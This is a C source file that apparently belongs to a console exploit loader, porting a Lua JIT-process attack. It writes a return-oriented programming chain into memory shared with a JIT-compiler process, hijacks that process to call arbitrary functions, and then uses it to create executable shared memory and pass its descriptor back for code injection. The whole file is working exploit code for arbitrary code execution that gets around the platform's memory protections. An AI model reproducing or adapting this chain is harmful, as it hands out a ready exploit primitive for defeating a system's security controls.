/*
 * Calls into the ps2emu JIT-compiler process, ported from Luac0re 2.4b
 * lua/jit/jit_rop.lua (MIT, Gezine).  After jit_init() the compiler spins on
 * a "pop rsp" loop in bridge memory that both processes map at the same
 * address.  We write a chain that loads six arguments + rax, calls the target,
 * stores rax to oob_scratch + 0x2000, restores the loop, and then break the
 * loop by writing the chain start into the loop's rsp slot.
 *
 * Only one caller may use the compiler at a time (Lua must stay idle).
 */
#include "ghost.h"

#define SCRATCH_RET 0x2000
/* Private area of the shared OOB scratch used for our compiler-visible
 * buffers (Luac0re itself uses +0x0..+0x62000 and +0x30000 strings). */
#define PRIV 0x70000

static inline void w64(u64 addr, u64 v) { *(volatile u64 *)addr = v; }
static inline u64 r64(u64 addr) { return *(volatile u64 *)addr; }

static int chain_idx;
static u64 push_chain(u64 v)
{
    u64 slot = g_ctx->fake_rsp + 0x1A0 + (u64)chain_idx * 8;
    chain_idx++;
    if (chain_idx == 66) {
        /* final write releases the compiler: keep it ordered last */
        __asm__ volatile("mfence" ::: "memory");
    }
    w64(slot, v);
    return slot;
}

u64 jit_call(u64 fn, u64 rax, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6)
{
    struct boot_ctx *c = g_ctx;
    chain_idx = 0;
    for (int i = 0; i < 6; i++)
        push_chain(c->rop_ret);

    u64 temp_r13 = ((c->fake_rsp - 0x20000 - c->rop_ret) / 4) + 1;
    w64(temp_r13 * 4 + c->rop_ret, 0);

    /* r8 = a5 (the mov-r8 gadget ends in "jmp rax + [rax + r13*4]") */
    push_chain(c->rop_pop_r12_r15_rbp);
    push_chain(c->leak_r12);
    push_chain(temp_r13);
    push_chain(c->leak_r14);
    push_chain(c->leak_r15);
    push_chain(c->leak_rbp);
    push_chain(c->rop_pop_rdi);
    push_chain(c->rop_ret);
    push_chain(c->rop_mov_rax_rdi);
    push_chain(c->rop_pop_rbx);
    push_chain(a5);
    push_chain(c->rop_mov_r8_rbx);
    /* r9 = a6 */
    push_chain(c->rop_pop_r12_r15_rbp);
    push_chain(c->leak_r12);
    push_chain(temp_r13);
    push_chain(c->leak_r14);
    push_chain(c->leak_r15);
    push_chain(c->leak_rbp);
    push_chain(c->rop_pop_rdi);
    push_chain(c->rop_ret);
    push_chain(c->rop_mov_rax_rdi);
    push_chain(c->rop_pop_rbx);
    push_chain(a6);
    push_chain(c->rop_mov_r9_rbx);
    /* rax, rdx, rdi, rsi, rcx */
    push_chain(c->rop_pop_rdi);
    push_chain(rax);
    push_chain(c->rop_mov_rax_rdi);
    push_chain(c->rop_pop_rdi);
    push_chain(a3);
    push_chain(c->rop_mov_rdx_rdi);
    push_chain(c->rop_pop_rdi);
    push_chain(a1);
    push_chain(c->rop_pop_rsi);
    push_chain(a2);
    push_chain(c->rop_pop_rcx);
    push_chain(a4);
    push_chain(fn);
    /* store rax */
    push_chain(c->rop_pop_rbx);
    push_chain(c->oob_scratch + SCRATCH_RET - 8);
    push_chain(c->rop_mov_deref_rbx_rax);
    push_chain(c->leak_rbx);
    push_chain(c->leak_r14);
    push_chain(c->leak_rbp);
    push_chain(c->rop_pop_r12_r15_rbp);
    push_chain(c->leak_r12);
    push_chain(c->leak_r13);
    push_chain(c->leak_r14);
    push_chain(c->leak_r15);
    push_chain(c->leak_rbp);
    /* restore the spin loop: [chain_end + 8] = chain_end */
    push_chain(c->rop_pop_rdi);
    push_chain(c->chain_end);
    push_chain(c->rop_mov_rax_rdi);
    push_chain(c->rop_pop_rbx);
    push_chain(c->chain_end);
    push_chain(c->rop_mov_deref_rbx_rax);
    push_chain(c->leak_rbx);
    push_chain(c->leak_r14);
    push_chain(c->leak_rbp);
    /* slots 64/65 overlay the spin loop: break it */
    push_chain(c->rop_pop_rsp);
    push_chain(c->chain_start);

    for (u64 spins = 0; r64(c->chain_end + 8) != c->chain_end; spins++) {
        if (spins > 2000000) {
            logf("jit_call: timeout fn=%lx", fn);
            return (u64)-1;
        }
        if (spins > 64)
            K.usleep(50);
    }
    return r64(c->oob_scratch + SCRATCH_RET);
}

static u64 priv(u64 off) { return g_ctx->oob_scratch + PRIV + off; }

u64 jit_read64(u64 addr)
{
    jit_call(g_ctx->jit_memcpy, 0, priv(0xF00), addr, 8, 0, 0, 0);
    return r64(priv(0xF00));
}

int jit_copy_to(u64 dst, const void *src, size_t len)
{
    const u8 *s = src;
    while (len) {
        size_t n = len < g_ctx->staging_size ? len : g_ctx->staging_size;
        memcpy((void *)g_ctx->staging, s, n);
        jit_call(g_ctx->jit_memcpy, 0, dst, g_ctx->staging, n, 0, 0, 0);
        dst += n, s += n, len -= n;
    }
    return 0;
}

#define SOL_SOCKET 0xffff
#define SCM_RIGHTS 1
#define SYS_sendmsg 28

/* Move a descriptor from the compiler process into this one. */
int jit_recv_fd(int compiler_fd)
{
    u64 ctl = priv(0x000), data = priv(0x040), iov = priv(0x060), msg = priv(0x080);
    memset((void *)priv(0), 0, 0x100);
    *(u32 *)(ctl + 0) = 20;
    *(u32 *)(ctl + 4) = SOL_SOCKET;
    *(u32 *)(ctl + 8) = SCM_RIGHTS;
    *(u32 *)(ctl + 16) = (u32)compiler_fd;
    *(u8 *)data = 0;
    w64(iov, data);
    w64(iov + 8, 1);
    w64(msg + 0x10, iov);
    *(u32 *)(msg + 0x18) = 1;
    w64(msg + 0x20, ctl);
    *(u32 *)(msg + 0x28) = 20;
    s64 rc = (s64)jit_call(g_ctx->jit_syscall, SYS_sendmsg, g_ctx->new_jit_sock, msg, 0, 0, 0, 0);
    if (rc < 0) {
        logf("jit_recv_fd: compiler sendmsg failed %ld", rc);
        return -1;
    }
    u8 rctl[32], rdata[4];
    u64 riov[2] = {(u64)rdata, 1};
    u8 rmsg[0x30];
    memset(rctl, 0, sizeof(rctl));
    memset(rmsg, 0, sizeof(rmsg));
    *(u64 *)(rmsg + 0x10) = (u64)riov;
    *(u32 *)(rmsg + 0x18) = 1;
    *(u64 *)(rmsg + 0x20) = (u64)rctl;
    *(u32 *)(rmsg + 0x28) = sizeof(rctl);
    ssize_t got = K.recvmsg((int)g_ctx->new_main_sock, rmsg, 0);
    if (got < 0 || *(u32 *)(rctl + 8) != SCM_RIGHTS) {
        logf("jit_recv_fd: recvmsg failed %ld errno %d", got, *K.errno_fn());
        return -1;
    }
    return *(int *)(rctl + 16);
}

int jit_block_create(struct jit_block *b, u64 size, u64 want_rx)
{
    memset(b, 0, sizeof(*b));
    size = ALIGN_UP(size, 0x4000);
    b->size = size;
    u64 name = priv(0x200), out = priv(0x240);
    strcpy((char *)name, "ghostldr");
    w64(out, 0);
    int rc = (int)jit_call(g_ctx->jit_shm_create, 0, name, size, 7, out, 0, 0);
    b->base_fd = (int)r64(out);
    if (rc != 0) {
        logf("jit_block: create(%lx) rc=%x", size, rc);
        return -1;
    }
    rc = (int)jit_call(g_ctx->jit_shm_alias, 0, (u64)b->base_fd, 3, out, 0, 0, 0);
    b->rw_fd = (int)r64(out);
    int rc2 = (int)jit_call(g_ctx->jit_shm_alias, 0, (u64)b->base_fd, 5, out, 0, 0, 0);
    b->rx_fd_compiler = (int)r64(out);
    if (rc || rc2) {
        logf("jit_block: alias rc=%x/%x", rc, rc2);
        return -1;
    }
    w64(out, 0);
    rc = (int)jit_call(g_ctx->jit_shm_map, 0, (u64)b->rw_fd, 3, out, 0, 0, 0);
    b->rw = r64(out);
    if (rc != 0 || !b->rw) {
        logf("jit_block: compiler RW map rc=%x", rc);
        return -1;
    }
    b->rx_fd = jit_recv_fd(b->rx_fd_compiler);
    if (b->rx_fd < 0)
        return -1;
    void *addr = (void *)want_rx;
    if (want_rx) {
        void *res = NULL;
        rc = K.mmap(addr, size, PROT_READ | PROT_EXEC, MAP_SHARED | MAP_FIXED, b->rx_fd, 0, &res);
        logf("jit_block: mmap fixed %lx rc=%x res=%p", want_rx, rc, res);
        if (rc == 0 && (u64)res == want_rx) {
            b->rx = want_rx;
            return 0;
        }
        addr = (void *)want_rx;
    }
    rc = K.jit_map(b->rx_fd, 5, &addr);
    logf("jit_block: jit_map rc=%x addr=%p (wanted %lx)", rc, addr, want_rx);
    if (rc != 0)
        return -1;
    b->rx = (u64)addr;
    return 0;
}

int jit_block_write(struct jit_block *b, u64 offset, const void *src, size_t len)
{
    if (offset + len > b->size)
        return -1;
    return jit_copy_to(b->rw + offset, src, len);
}
